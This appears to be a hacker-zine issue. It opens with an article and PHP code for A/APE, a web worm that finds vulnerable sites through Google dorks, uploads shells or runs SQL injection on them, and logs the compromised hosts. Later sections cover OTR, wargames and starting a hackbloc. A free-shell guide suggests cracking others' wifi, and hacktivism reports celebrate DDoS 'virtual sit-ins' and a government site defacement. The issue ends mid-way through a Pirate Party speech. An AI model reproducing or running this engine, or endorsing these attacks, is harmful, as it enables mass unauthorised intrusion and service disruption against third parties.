a web-worm in PHP (whose concept was featured in HackThisZine #3) for the next
release of the RRLF e-zine (#7). A/APE (Artificial/Automated Pwnage Engine) is a
modification of Ouroboros' engine that consists of an exploit 'class' (just a
stupid small template which would have been an abstract class if it weren't for
the necessity of backwards compatibility with PHP4 for the webworm) with several
child classes each with their own exploit code located in a similarly
constructed Sploit() function, thus allowing for heavy use of class polymorphism
(and less lines of code).

[0x01] The concept
Well, there are three major requirements for A/APE:
1) The engine should spider all vulnerable targets on the web (or as much as
possible)
2) The engine should be very modular (easily extendable, different sploits
adaptable to 1 standard)
3)The engine should log results so the hacker can control the pwned targets
later.
Requirement 1 is simple to complete, we'll use the unlimited power of google.
Now I hear everyone mumbling ""tskpscht google api tskpscht"" but no worries, I
don't like the google API either (I actually don't care if you like it at all, I
just don't like it). It is very easy to use google without having to do all the
google-api hassle with the following concept:

1) Post a GET request to google.com with the following parameters:
search?as_q="".UrlEncode($searchquery).""&num="".$sta rtfromthisresult.""&hl=en

2) Add the found targets to the $targets array. Check whether we have reached
too much queried results (we don't want to stick to the same vuln forever now do
we?) if so quit else goto step 1

Well, the biggest dificullilty lies with requirement 2. We can devide all major
and common webapp-vulns (we'll only discuss webapp-vulns in this article) into 4
catogories:

1)Unauthorized file uploading
2)Local/Remote file inclusion
3)SQL injection
4)XSS

So we'll organize the exploits like this (in a matrix form):

$Sploits = array();
$Sploits[0] = array(); // array of all file upload exploits
$Sploits[0][0] = new WhateverExploit();   //etc,etc

Also we should manage all ""googledorks"" (google searchqueries to find targets)
like this (thus googledorks $dork[0][3] being the dork for $Sploits[0][3]).
Since every exploit is different in concept and requires diffent parameters, I
generalized the concept per exploit (currently only Fileupload exploits and SQL
exploits):

Upload exploits: Sploit($host,$port,$path,$filename,$filecontent){}
SQL injection: Sploit($host,$port,$path,$sql,$username,$pass){}

Since most file upload exploits require little more than a target and a file,
this'll suffice. The case of the SQL injection is a little different though. SQL
injection usually requires nothing more than a prefab SQL query, which can be
defined in
SQLSploit->SQLQ, the sample exploit I included with this A/APE release required
a username and password for user creation though (this is also quite common) so
I included these parameters with the function prototype (feel free to change
them to you hearts content though).

[0x02] Show use the 0xC0DE!
Okay, let's talk code. Sending a packet in PHP is simple as pie:
function sendpacket($host,$port,$pAcKeT) // packet sending function
{ $ock=fsockopen(gethostbyname($host),$port); // open socket
if (!$ock) return ""No response"";
fputs($ock,$pAcKeT); // send!
$HtMl=''; while (!feof($ock)) { $HtMl.=fgets($ock); // read socket }
fclose($ock); return $HtMl; }

To google for targets we need to follow the steps discussed in section 0x01.
Here is a function that googles for a certain query.

function Google4Targets($host,$search,$num) // google for targets
{$query = ""/search?as_q="".UrlEncode($search).""&num="".$num.""&hl =en"";$q =
""http://"".$host.$query;
$packet =""GET "".$q."" HTTP/1.0\r\n""; // Get packet
$packet.=""Host: "".$host.""\r\n"";
$packet.=""Connection: Close\r\n\r\n"";
$html = sendpacket($host,80,$packet); // send it
$temp=explode(""of about <b>"",$html); // get number of results
$temp2=explode(""</b> for "",$temp[1]);
$total=$temp2[0];
$total = str_replace("","","""",$total);
$looplen = $total / $num; // number of pages to query
for($r = 0; $r < $looplen; $r++)
{
$strt = $r * $num;
$query = ""/search?as_q="".UrlEncode($search).""&num="".$num.""&hl =en&start="".$strt;
// query
$q = ""http://"".$host.$query;
$packet =""GET "".$q."" HTTP/1.0\r\n"";
$packet.=""Host: "".$host.""\r\n"";
$packet.=""Connection: Close\r\n\r\n"";
$html = sendpacket($host,80,$packet);

$temp=explode(""<a class=l href=\"""",$html); //all url results are in<a class=1
href=""urlhere""> form
for ($i=1; $i<=count($temp)-1; $i++) {
$temp2=explode(""\"">"",$temp[$i]);
$targets[$targetcount] = $temp2[0]; // add to targets array
$targetcount++; } } }

The auto exploitation engine would look like this:

function AutoXploit() // exploit routine
{ for ($l = 0; $l < count($dork); $l++) {
for($i = 0; $i < count($dork[$l]; $i++) // all dorks of current subgroup
(XSS,SQL injection,etc) {
$targets = array();
$targetcount = 0;
Google4Targets(""www.google.com"",$dork[$l][$i],100); // google them
if ($targetcount > $searchlimit) // not higher than limit
$targetcount = $searchlimit;
for ($x = 0; $x < $targetcount; $x++) {
$targets[$x] = eregi_replace(""http://"", """",$targets[$x]);
$temp = explode(""/"",$targets[$x]); // deconstruct URL
$base = $temp[0];
$extend = ""/"";
for($r = 1; $r < count($temp)-1; $r++) {
$extend .= $temp[$r].""/""; }
if($l == 0) // UPLOAD
$sploits[$l][$i]->Sploit($base,80,$extend,$shellname,$shellcontent);
elseif($l == 1) // SQL
$sploits[$l][$i]->Sploit($base,80,$extend,$sploits[$l][$i]->SQLQ,$user,$pass);}}
 }  }

Well I hope this small article was usefull and gave you some insights and/or
Ideas. For sample code, please see the code that comes with this zine, it's
released under the GPL, but remember, i'm not responsible for any damage done by
or coming forth from this code!
Nomenumbra.

                     -####################################-
                     -####           RECIPES           ###-
                     -####################################-

################################################################################
#                 HOW TO: Use Off The Record Instant Messaging                 #
################################################################################

Off the Record (OTR) is a encryption and authentication plugin for Gaim. It uses
public/private encryption and signs all your messages with a digital signature
to verify that you are their true sender. Unencrypted instant messages are
easily picked up by packet sniffing tools, these becomes all the easier when
your sending them over a public WIFI network. Also with the new AOL Terms of
Service they claim by using their software you ""Waive any right to privacy.""
Well fuck that, start encrypting your messages and show AOL you do have the
right to privacy especially from them. Installing the plugin is easy as can be.

Install: Download the latest release from http://www.cypherpunks.ca/otr as of
this writing the latests version is 3.0.0. Once you compile the sources, or if
your using windows run the .exe, you have to enable Off The Record. To do this
in gaim click on Preferences, or Tools > Preferences from within the buddy list
window. Once in the Preferences menu choose ""Plugins"" from the left menu. Scroll
down untill you see ""Off-The-Record Messaging"" click on the check box to enable
it.

Configure: Now that you have it installed there should be a submenu under the
plugins menu for OTR. Click on the ""Config"" tab. Here you can generate your key
pair. Click the generate to produce your keys. Also make sure that Enable
private messaging an Automatically initiate private messaging are checked.

Usage: Now when ever you talk to someone who also has OTR you will begin a
private converstation. The First time you talk to them you will be prompted to
accept their fingerprint. The fingerprint is a string which is used to idenify
their key. Also you will notice a new button on your conversation window, that
will eather say OTR: Private, if a private conversation has been started, else
it will show OTR: Not private. To start a private conversation simpily click
this button.

Additional help: http://www.cypherpunks.ca/otr   http://www.hackbloc.org/forums/

################################################################################
#                     HOW TO: Start A Wargames Competition                     #

################################################################################

As one of the designers of the Root This Box challenge, I'd like to share
somethings I've learned about creating and maintaining an exciting, safe
wargame.

0. Users
A contest is nothing without users. Try to find a good mixture of skills from
online and offline communities. Recruit people of skill from 2600 meetings,
LUGs, classes, IRC channels, or anywhere else where smart people tend to
congregate.

1. Boxes
The targets you setup are also critical to the success of the competition. Try
to get interested users from step 0 to pony up some of their spare boxes for the
competition. A variety of operating systems, services, and vulerabilities tends
to be most fun. Some successful boxes have run custom services with source
disclosure. Others have setup unpatched services with an intended progression of
escalation. Some of the others have just been regular boxes with some unintended
holes. Optionally, you may consider equipping a small number of systems with
virtual machine software to get a larger system diversity with a smaller number
of systems, but this option does require considerably more configuration.
However these boxes are setup, the more boxes and diversity, the more likely it
becomes that at least a few are crackable.

2. Rules
A set of well-defined rules can give a contest enough form for good fun, but
trusting users to follow policies may not be the best way to enforce your
policies. Consider automating and configuring rules into your competition
wherever possible. One of the primary rules should be not interfering with
others' abilities to play the game, so restrictions should be implemented on
changing passwords, process usage, disk space allocation, and anything else that
might affect other users' ability to play. In addition, some users might use
competition servers as hops for rather nefarious deeds, so it might be wise to
limit the use of network utilities to external targets.

3. Scoring
There are many potential ways to calculate scores for these things. All revolve
around who currently has control of a system. One way involves computing points
for the presence of certain service types of services, but this does take a fair
amount of code. A fixed score for each box will function well too. Scores might
be computed hourly, daily, at the end of a competition, or whenever. There is
plenty of room to use your immagination on this topic.

4. Timeframe
It is important that the challenge doesn't expire before any boxes are cracked
and keeps up a suspenseful level of activity from start to finish. Choose your
timescale to fit the competition type and to maximize the fun.

Happy hacking.

################################################################################
#                           HOW TO: Start A Hackbloc                           #
################################################################################

 While the internet can be a great resource for learning, it can also be a very
alienating place. If we want this movement to grow, we not only need to get
organized but we need to get local. What better way to do this than to START
YOUR OWN HACKBLOC.

PRIVATE AFFINITY GROUPS vs PUBLIC MEETINGS
There are advantages and disadvantages to each model of organization. Certainly
having open meetings at a public space that you can advertise would be more
friendly to draw in new people and give presentations. However such environments
are not appropriate for more sensitive work and research, where holding private
meetings at more secure locations would be more suitable. Forming an affinity
group of a few trusted people who already know each other, where skills
complement each other, and where everybody knows the level of dedication /
security to each other is best suited to more hands-on or questionable
activities. Successful hackbloc groups would maintain a balance between both
public/announced and private/work meetings.

* Look for Existing Groups
There may already be get-togethers in your area of people working on similar
stuff. Look for linux user groups, 2600 meetings, hackbloc, hacklabs, binrev
meetups, ACM or other CS college groups, computer co-ops, or otherwise. Check
out a few meetings to get the feel if it is what you are looking for. If not,
talk to organizers and see if you can help organize the group to make it
exciting and active again. Otherwise you can make contacts and resources to
build for your own meetings.

* Look for public spaces to hold meetings
The best spots would be centrally located geographically and easy to find
especially through public transportation. Major urban areas, cities, or college
campuses would be ideal as these are likely to contain the greatest
concentration of potential members.

Next, try to find a space or room to hold the actual meetings. For open meetings
it would have to be in a public place (or a friendly commercial location). At a
minimum , it would have to be big enough for tables and chairs for a dozen
people, with access to power, internet, and room to set up networks and other
equipment. Some possible locations would be public libraries, college campuses,
art/activist spaces or coops, friendly internet cafes, infoshops, community
centers, etc. Some groups have had success with meeting at a coffee hop
especially ones located at major transportation centers convenient for people
taking the train. The first few meetings can be just a temporary meetup spot
until people can talk about more accommodating or convenient locations for a
more permanent meeting space that you could send out public announcements.

When exploring possible spaces, talk to the management and introduce yourself
and the group you are starting. Explain it positively using words like
'teaching' and 'sharing', not 'hacking' and 'pirating', and if it is a business
explain that you might be able to bring them some customers. Some places it
could be advantageous to be 'sponsored' by an internet cafe or becoming an
'official' student group, as long as it does not compromise the ideals or
practice of the group.

* Gather Resources + Equipment
At the bare minimum, the meeting space needs to have tables/chairs, power, and
the internet. However, there are all sorts of fun toys you can bring that will
help facilitate the meeting as well as provide interesting workshops for people
to teach and learn. Routers + ethernet cables not only allow you to share files
or play multiplayer games but building a network can be a hands-on learning
experience for those who've never done it before. A wireless router would be
ideal. A sound system would be good for presentations or playing music in the
background - also if meetings get big enough or if you have an awesome space to
throw parties at, you can bring bands or DJs and have bouncing dance parties
after the meet. Chalkboards, white-boards, overhead or digital projectors are
ideal for presentations, workshops, or other collaborative brainstorming
activities. Printers would be good for copying flyers, zines, posters, bits of
code, etc. People can also bring monitors and ""junk boxes"" so people can build
systems that people can play with - especially to tinker with new or obscure
operating systems or use as public computers for those who don't bring their
own. These are just a few toys and accessories one can bring: and make sure it's
clear to attendees that they are free to bring their own goodies as well!
* Outreach + Promotion
For public gatherings, consider doing some outreach to bring new people in. Once
your core group has decided a date and space for your first meeting, make some
flyers and posters. Put together an announcement explaining that you are trying
to get this group together and that you are having an initial planning meeting
at this place at this time: all are welcome. Send it off to relevant local
groups as well as online networking sites like indymedia, craigslist, even
myspace or tribe.net. Attend local meetings and hand out flyers. And get your
friends together and make sure they bring cool tricks + ideas for the first
meeting.

* Meet!
The day of the meeting will come and once you get people in the space with all
the right ingredients it's time to get it started! Make sure you introduce new
people to existing members and create a friendly and accomodating environment
where people can express themselves and introduce new ideas. After initially
socializing and enough people have showed, it's time for the formal meeting.

Round table meetings are usually the best way for everybody to hear each other
and create a friendly equal and open environment for new people to introduce new
ideas. If there are a lot of people or a lot of things that need to be discussed
then a meeting facilitator and an agenda is probably needed. So announce that
the meeting is starting, circle up chairs + tables so everyone can face each
other and be in on the discussion and start with introductions. Go around the
room and give everybody a chance to introduce themselves + their skills and
interests. Afterwards, create time to brainstorm items to be discussed and added
to the agenda (useful for the facilitator or notetaker). Then go over each
agenda item one by one bringing up issues proposing and deciding on ideas.

As it is your first meeting there are probably lots of agenda items to bring up
so the group can decide it's identity, prioritize it's goals, and brainstorm
future ideas for growth. Think about points of unity + strucure of the group
(democracy, consensus, open, etc). What would be a good time/date/location for
next meeting (monthly meetings at regular dates?). Pool together resources for
the group and think about and propose ways people can get a hold of each other
(pass around a sheet to collect emails or #s). Start an email list, message
board, blog, or website. Brainstorm ideas for presentations, workshops, or other
special events(possibilities listed below). Finally, announce other upcoming
actions, groups, and decide on the next meeting.

IF YOU ARE STARTING GATHERINGS IN YOUR AREA, WEW OULD LIKE TO HEAR ABOUT IT!
Get in touch with the global hackbloc collective so that we can help cross
promote your local groups. Jump on the IRC server at irc.hackthissite.org SSL
port 7000 in #hackbloc or #hackthissite . We can also help set up design or host
your website at hackbloc.org. Get involved at hackbloc.org or email
hackbloc@gmail.com

Possible Ideas for Workshops and Presentations
* Hold workshops on online security culture: showing people how to use and
install tor/privoxy(secure proxy through onion routing), using SSL on IRC, off
the record(for secure AIM chats), pgp/gpg, how to clear your system of temporary
files, internet caches, ""deleted"" files, etc

* Explore alternatives to copyrights / anti-copyright activism: have a 'pirate
file share fest', set up file servers on the network, promoting creative commons
/ copyleft / anti-copyright media and projects

* Have a ""linux fest"" and play with various distros and livecds, encouraging
people to bring their machines + install or dual boot linux

* Play the HTS challenges to learn the basics of web hacking in a realistic
environment

* Have a web development / programming party and make a site for the group

* Host hacker wargames competitions and code auditing workshops - we can several
LAMP systems(perhaps with non-permanent environments, like making a customzied
livecd) and install several open source CMS systems to practice remote intrusion
and defense while playing ""king of the hill""

* Bring lockpicks + invite people to bring various locks to practice on

* USE YOUR IMAGINATION

################################################################################
#             HOW TO: Start A Free Shell Server / Pirate Wifi Node             #
################################################################################

If you have machines lying around and have a relatively fast and stable internet
connection, consider opening it up to the world to be used as a free shell
server or pirate node.

* free shell server - give people the chance to play around with linux
* file server - allow people to swap files with other users on the system. you
can set up sftp/ssh, ftpd, or some sort of web based upload / file listing
system.
* tor node - if you have lots of bandwidth, consider setting up a tor exit node
. this has the added advantage of allowing any possible law enforcement on your
network to not be able to distinguish random tor server traffic from your
personal communications being routed through tor.

Setting up Free Shells
If you don't want to have to create accounts for people manually, you can use a
few scripts to automate the process. In this article, we are going to describe a
system which had been developed and used by Hairball with the HBX Free Shell
project.

We create a 'new' user account that people would log onto to create their own
account; and instead of bash or sh, this account's shell would be set in
/etc/passwd to refer to a binary stored on your system which would prompt the
user for their desired username and create the account and their home directory.


The program is essentially a perl script wrapped in a SUID binary written in C.
The source code can be located at:
disrespectcopyrights.net/archive/Code/new.pla.txt

If you are worried about being shut down, receiving cease-and-desist notices, or
being raided by law enforcement, consider disguising the source IP of the server
using Tor Hidden Services. This allows you to set up an anonymous domain name
that is only accessible to others browsing through Tor, where the source IP of
your server is obfuscated by routing through the tor network in reverse.

If you have two wireless cards, and there are password protected wireless
networks, you can crack the network and set up your own network to redistribute
the internet access from the first.

                     -####################################-
                     -####           ACTION            ###-
                     -####################################-

################################################################################
#                International Solidarity to Free the Sagada 11                #
################################################################################

Two of the Sagada 11 Freed!
 TWO among the eleven tortured and illegally arrested backpackers also known as
the SAGADA11, were already released from La Trinidad District Jail on May 30,
Asian Commission on Human Rights (AHRC) said, Thursday night. 

Minors Frencess Ann Bernal (15) and Ray Lester Mendoza (16) were released from
La Trinidad District Jail after the court granted the earlier petition by their
legal counsel to turn them over to their parents. The two minors were amongst
the 11 torture victims detained in La Trinidad, Benguet. They were illegally
arrested in February 14, 2006 at Buguias Checkpoint by Police authorities who
claimed that they were in ""hot pursuit"" of suspected Armed Rebels. 

 In a separate newspaper report, Judge Agapito Laoagan Jr. ruled the
""warrantless"" arrest by the police as illegal as it did not fall under the
principle of a ""hot pursuit"" operation. Under arrests made by virtue of ""hot
pursuit"" operations, warrants may not be required. Further, the arrests should
be made within hours from the commission of the crime.


Sagada11 Solidarity Action Held in Spain
by Jong Pairez (Indymedia Volunteer)
NEWSBREAK! (3/14/2006) Police authorities asked the Quezon City judge to issue a
search warrant for Philippine Center for Investigative Journalism (PCIJ)
headquarters, late this afternoon. The request for the warrant issue is
apparently in connection with inciting to sedition charges that similarly forced
a local newspaper to shutdown, last month. 

BARCELONA, Spain-- Protest Banners were hanged outside the Philippine Embassy,
surprising passersby in Barcelona, yesterday (March 13), by a group of unnamed
Spanish activists, saying, ""Basta de Torturas en las Filipinas (enough torture
in the Philippines)"" and ""11 de Sagada LIBERTAD! (free the Sagada 11!)"" 

 Leaflets were also distributed, informing passersby about the rampant Human
Rights violation in the Philippines under the Arroyo Regime. The group of
Spanish activists who did a small solidarity action for the unconditional
release of Sagada 11, specifically condemned the illegal arrest and violent
torture suffered by the eleven young backpackers from the hands of Philippine
authorities. 

 TOKYO AND THE SAGADA 11

""As everyone gathers for food prepared by a vegan guerrilla kitchen collective
known as Kaizouku Cafe, Poets were already breathing metaphors of burning
Molotov cocktails in their hands, making words as bullets for a calibre pistol
that can strike an enemy in one blow.""

 It was Saturday night in Tokyo, as usual the post-industrial cosmopolitan city
ambience is the same, although the season has changed from Winter to Spring (it
is much less colder). Thus, everywhere is noises of ambulance sirens in the
streets, stressed salary men strolling like living deads, and common music of
monotonic rhythm from a subway train constitutes the everyday life of an
ordinary dweller.

 I just came out from my work somewhere in the posh district of Hiro-o to join
the closing party of our DIY multi-media artshowÑSeppuku2, which opened last
month in Irregular Rhythm Asylum (IRA). It took me thirty minutes before I was
able to get into the venue that is located in Shinjuku. Before I was able to
enter the door of IRA, several of individuals, mostly from the new ""Zengakuren""
generation were already there, sharing food and beer. I thought the night will
be the same, but it was not.

SOLIDARITY NIGHT FOR SAGADA 11
The closing party was a solidarity night. As everyone gathers for food prepared
by a vegan guerrilla kitchen collective known as Kaizouku Cafe, Poets were
already breathing metaphors of burning Molotov cocktails in their hands, making
words as bullets for a calibre pistol that can strike an enemy in one blow.
There was anger, it was anger against all kinds of Authority that strangles the
human soul, which has killed and detained a dozen including the eleven innocent
and young hitchhiker punks in the Philippines known as the Sagada 11.

After a while of continuous spontaneity, Sha-do-U of IRA beamed the online
petition campaign to free the Sagada 11 on the wall from his computer. He also
made a brief speech about the issue.

The expression of solidarity came in different ways, but some has pushed the
button to include their names on the online petition. Some of them were band
members of various punk bands in Tokyo, including Masau of The Urchins.

Kaori of the punk rock bandÑThe Happening, which is considered one of the
legends in Tokyo punk scene offered a song entitled ""Fuck the Bastards"" in
acoustic while I was about to drink my third beer. She fluently expressed well
the same emotion that everybody feels during a confrontation against authority.

Our night of solidarity continued and every hour was a surprise, while the
common life outside is totally predictable. I thought the night is the same, but
it was not until the night has produced a moment of action, of expression and
solidarity of love.

** A Freed Sagada 11 Prisoner Speaks Out **
It's an amazing experience to be a part of a hacktivist action and know that you
can be anywhere on the planet and like minds exist. The impact that the web sit
in had and the impetuous for it was something to behold. It all started from a
plea from a Filipino to an American (who both happened to be in Japan) to get
the word out that their friends were jailed and tortured just because their
government thinks punkers are different. These punkers were just helping people
get food for god sake (Food Not Bombs)! The American had contacts and before
long, the Office of the President and the Philippine National Police websites
were shut down because hacktivist got involved and helped to get the word out.
From there, international press got wind of the situation and the web sit in
garnered international attention and support. The American returned to the
states to find out that the action reached the American press. 3 months later, 2
of the prisoners were released and live to tell the situation. I just want
people to realize that actions matter. Don't sit around thinking you can't make
a difference, when no matter where you are you can. Don't EVER let them tell you
otherwise. - Sally

This is an interview from one of the SAGADA11, her name is Ann, living at
Marikina City Philippines. We interviewed her with a condition that we won't ask
her about what happen or to re-summarized the incident of torture.

Q: What were you feeling when most of your visitors unfamiliar faces?
A: I'm very much happy, I'd seen the true camaraderie really stands for,
thinking that we are just genre-mates or let say punk-mates.

Q: Have anyone told you the actions done by the Internet Justice League?
A: Yes,

Q: What do you know about them?
A: They are the ones that help to spread the issue internationally and they were
the ones that participated in the virtual sit-in done to pressure the Philippine
government by means of messing with their websites.

Q: Now that you are now out in jail, tell something about it.
A: At first; we're very much happy, but just after a few days had pass, a police
that introduced themselves as CHED (Commission on Higher Education)
representatives and was looking for me, fortunately I was out. My mother was
wise enough to trace it with the help of the CHED officials and said that they
didn't send anyone the look for Ann. In the case of PETRA, someone also came to
his school and showed some photos; Ray Lester (Petra) with someone in High
status of the NPA (New Peoples Army), creating a hearsays, at school that Petra
is a real NPA. We are required to report to the DSWD (Department of Social
Welfare and Development). We are also told that Camp Crame has an eye watching
us, under surveillance

Q: Aside from being happy, what other emotion arise from being released?
A: I'm somewhat ashame, because people tells me that ""so you are already out in
jail""

Q: Why are you ashame when people tells you that?
A: Because my family treat me differently. When they tells me that, I'm thinking
that they believed that I'm what I'm accused of. I'm also ashame also because
the society is not accustomed to a girl, especially at my age, already got a
piece of taste in jail.

Q: Treat differently, what do you mean, bad or good treat differently?
A: both bad and good; the society now treats me like I'm the only one that
needed the help. How about those other person that need more of their reaching
arms. I don't what them to treat me baby, different from the other, I just want
them to treat as what they treated me before.

Q: Are you studying?
A: Yes, I'm grateful that we've reached the school's enrollment period.

Q: Now that you are studying. What are your plan?
A: Spend it schooling, time is taking a toll at me.

Q: How about going to gigs and mobilization/movements?
A: I think going to gigs would be fine, but mobilization, maybe I'll just say
pass for now.


Q: What is you greatest fear?
A: I don't want that to happened to me or to anyone else anymore.

Q: You said that you would be lay lowing on the mobilization. How do you plan to
contribute for you fear not to happen.
A: I've seen many points from that experience. I've seen what is wrong, and
learned a lot from this experience. All I have to do, is to share this
experience so that is wouldn't happen to anyone anymore.

Q: This would be my final question. What do you still need?
A: For me? Maybe your question should be not what i need, but what do the
remaining SAGADA 11 needs?

Q: What do you think they need?
A: Food is a major need they have to think everyday. Food is given not to
satisfy their hunger but just for the stomach to be filled with something. I
think that they need money to accommodate this needs.

To send help contact us in liberation_asusual@yahoo.com or pjames_e@yahoo.com.au


MANILA: BrigadaElektronica electronic disturbance group strikes again

""Technology has boasted that it enables people in getting closer to each other,
so we are going to show that if we can't get closer to Malakanyang and protest,
we will closely express ourselves inside Malakanyang palace itself by just one
click,"" says one of the group's technician who want to keep anonymity.

 MANILA-- The current ban of public assemblies and free speech in the streets
has given birth to online protest action namely- ""electronic sit-in.""

 BrigadaElektronica electronic disturbance group first introduced electronic
sit-in last year as an online version of support to the striking workers of
Gelmart in Metro Manila who then occupied the factory, held a picket line and
obstructed the capitalist boss's activity in laying-off the workers. The group
held a similar action by occupying (sit-in) the official Gelmart website; of
course, the action successfully declared ""no business as usual, workers on
strike!"" (the Gelmart website literally stopped as thousands of online
participants joined the sit-in)

 This time, the electronic disturbance group is once again announcing their
second electronic sit-in campaign, targeting the Malakanyang website, PNP and
Office of the President. The action officially starts on March 23, 2006, it will
last until the first of April.

 ""Technology has boasted that it enables people in getting closer to each other,
so we are going to show that if we can't get closer to Malakanyang and protest,
we will closely express ourselves inside Malakanyang palace itself by just one
click,"" says one of the group's technician who want to keep anonymity.

 The group also said that this electronic sit-in demands the unconditional
release of eleven young backpackers including a fifteen-year-old girl who were
illegally arrested, tortured and wrongfully accused as NPA's by Philippine
authorities, while the innocent-care-free kids were only just hitchhiking on
their way to the beautiful Sagada Mountains. ""If the responsible authorities
will not take heed for the call of these kids' parents who were very much
dishearten for taking away their sons and daughters the freedom to travel;
government websites will virtually be deleted. "" says one of the technicians.

 ""The Benguet Police and Military must also give apologies to the victims of
their inhuman activities,"" demands the group.

Computer-savvy protesters start
'virtual sit-in' campaign 

COMPUTER-SAVVY Philippine protesters took civil disobedience to cyberspace
Thursday, launching a ""virtual sit-in"" campaign that urged online activists to
overwhelm the police Web site with numerous hits.

Protesting alleged human rights abuses, protesters calling themselves
""Electronic Brigade"" opened a Web site that directs visitors to the main
national police site.

""You are about to take part in an online direct action protest. Please confirm
that you are willingly taking part in this action by clicking OK or exit without
taking part by clicking cancel,"" the message said.

The activists, who are not identified, said their brand of ""hacktivism"" is legal
because it technically involves just visiting a Web site.

Police did not comment immediately, and it wasn't clear how many hits their Web
site recorded.


The activists' Web site opens with a cartoon of the ""Electronic Brigade"" members
dressed as super heroes, wearing masks and caps. A blurb accuses police of
rampant human rights violations, including allegedly torturing 11 teenagers it
said were wrongfully accused of being communist guerrillas.

The 11 young people were arrested last month while on their way to the northern
tourist town of Sagada. Their lawyer, Pablito Sanidad, on Thursday asked a court
in northern Benguet province to free them, saying they were arrested without
warrants or probable cause.

Provincial police chief Senior Superintendent Villamor Bumanlag earlier said the
11 were identified by government militiamen as communist guerrillas and denied
they were tortured.

Bringing Street Protest to Cyberspace
by Manila Indymedia

NEWSBREAK! (28/3/2006) HACKTIVISTS expressing solidarity with the 11 political
prisoners known as the Sagada 11 have hacked and defaced the website belonging
to the National Defense College of the Philippines. Their website now reads, ""We
don't need the government, we don't need the military, we need JUSTICE AND
LIBERTY for the SAGADA 11!"", along with several links encouraging people to show
their support.[ Read More ]
UPDATES! (26/3/2006) VIRTUAL SIT-IN ends today, says BrigadaElektronica in a
message forwarded through emails, the group thanked the participants who
corageously joined the direct action that shuts the PNP website down (wednesday
March 23). About 1,088 users participated in the action bringing the message
FREE SAGADA 11. The group vowed to continue the campaign, saying, ""stay tuned
for our next target.""
UPDATES! (24/3/2006) GEOCITIES.YAHOO.COM responded to the ongoing virtual sit-in
by blatantly deleting the html pages that had been set-up by BrigadaElektronica
and JLI. But the group says ""no need to worry,"" after suggesting cyber
protestors to use the mirror sites.
UPDATES! (23/3/2006) HACKTIVISTS from USA expressed solidarity with Filipino
online activists by hijacking the PNP.GOV.PH ""Report a Crime"" form with an
automated response that let people join the virtual sit-in. [ Read More ] 

A GROUP of online activists offered an alternative space to protest after the
Philippine Government violently prohibited the streets and freedom parks to
exercise public assembly and practice freedom of speech. The online activists
calling themselves BrigadaElektronica electronic disturbance group organized an
""electronic sit-in""- bringing street protest actions on cyberspace. 

 Electronic sit-in is a form of electronic civil disobedience deriving its name
from the sit-ins popular during the civil rights movement of the 1960s, a
virtual sit-in attempts to re-create that same action digitally using a DDoS.
During an electronic sit-in, hundreds of activists attempt to access a target
website simultaneously and repetitively. If done right, this will cause the
target website to run slowly or even collapse entirely, preventing anyone from
accessing it. [source: wikipedia] 

 The action officially starts on March 23, 2006 (10:00am Manila time), it will
last until the first of April. They are inviting everyone to join and occupy the
Philippine National Police website for being a rampant human rights violator.
 [ Read More ][ UPDATES FROM HACKSITES: Post.Thing.Net | SDHacklab |
Hacktivist.com | Hackthissite ] 
 
 
Interview with Brigada Elektronika
A: When did it all started? Let's decipher the myth, give basic ideas or
principles of Brigada Elektronika on the slate for the stream of conscious
humanity (left in anyone) to digest.

ErroR: It started as a direct action project to support the striking workers of
Gelmart Inc., last year. The mission was to launch a parallel action online. So
basically, it was the specific mission which binded the group to fulfill the
project. Obviously, the project is very temporary and momentary. Three
individuals were involved in this project, one of them was inspired by the
Electronic Disturbance Theatre, hence, the name BrigadaElektronika was born.

A: Is the goal long term or short lived?

ErroR: We only want to create a snapshot or a spot from memory that will last
until time succumbs to death. Therefore, the goal is to let others create their
own moment i.e. direct action(wether it is hacking, sit-in,etc.) Because, to
attain freedom/liberation is neither Long or Short.

A: Most of the activist circles are rather new to this form of direct action.
Can this be a new wave of method & vantage point for people, when Free Speech is
outlawed when it crosses the line?

ErroR: Yes. Because, as an activist, IMAGINATION is our duty. It is our only arm
to fight all forms of authority that threatens our capacity to think and
express.

A: What are the dynamics of the group. Do you support various struggles that is
not directly connected with the Brigada Elektronika in organizational basis..

ErroR: The group is so loose, and we dont even consider BrigadaElektronika a
group, but rather a name of a project. So in terms of connecting to others in
organizational basis, we prefer our individual capacity to decide and commit in
joining other group's action and projects.

A: Ive been informed that online/or virtual sit ins are legal in some cases. Can
you elaborate this to justify attacking several targets including the PNP
servers.

ErroR: There is no law that prohibits anyone to visit a website. It is simple as
that.

A: Do you consider yourself a hacker, anarchist if anything.. In times of war,
commodity & marketed foods with plastic labels. How do you label yourself?

ErroR: I consider myself as a dreamer, struggling to exist in this World who
proclaimed that dreaming is dead.

A: Few criticisms coming from the elements of poseudo luddites & immature
elements in the counterculture scene view virtual direct actions are mere
assimilation to the machinery of the State. What is your opinion? Do you have
any counter arguments about this..

ErroR: A virus cannot be assimilated by any kind of systems, imagine you are a
virus. This tiny little virus once it penetrates a system, it can shutdown even
the most formidable structure.

A: Lines have been drawn & there is no turning back. Comments, statement you'd
like to address.. before we wrap this shit up.

ErroR: Things have been tough lately for dreamers. They say dreaming's dead,
that no one does it anymore. It's not dead, it's just been forgotten. Removed
from our language. No one teaches it so no one knows it exists. The dreamer is
banished to obscurity. Well I'm trying to change all that, and I hope you are
too. By dreaming every day.Dreaming with our hands and dreaming with our minds.
Our planet is facing the greatest problems it's ever faced. Ever. So whatever
you do, don't be bored. This is absolutely the most exciting time we could have
possibly hoped to be alive.

And things are just starting.
 

################################################################################
#                      RICKHARD FALKVINGE : I AM A PIRATE                      #
################################################################################

http://www.piratpartiet.se
http://www.pirate-party.us
http://www.pp-international.net


 Friends, citizens, pirates: 

 There is nothing new under the Sun. 

 My name is Rickard Falkvinge, and I am the leader of the Pirate Party. 

 During the past week we have seen a number of rights violations taking place.
We have seen the police misusing their arresting rights. We have seen innocent
parties being harmed. We have seen how the media industry operates. We have seen
how the politicians up to the highest levels bend backwards to protect the media
industry. 

 This is scandalous to highest degree. This is the reason why we are here today.


 The media industry wants us to believe that this is a question about payment
models, about a particular professional group getting paid. They want us to
believe that this is about their dropping sales figures, about some dry
statistics. But that is only an excuse. This is really about something totally
else. 

 To understand today's situation in the light of the history, we must go back
400 years - to the time when the Church had the monopoly over both culture and
knowledge. Whatever the Church said, was the truth. That was pyramid
communication. You had one person at the top talking to the many under him in
the pyramid. Culture and knowledge had a source, and that source was the Church.


 And God have mercy on those who dared to challenge the culture and knowledge
monopoly of the Church! They were subjected to the most horrible trials that man
could envision at the time. Under no circumstances did the Church allow its
citizens to spread information on their own. Whenever it happened, the Church
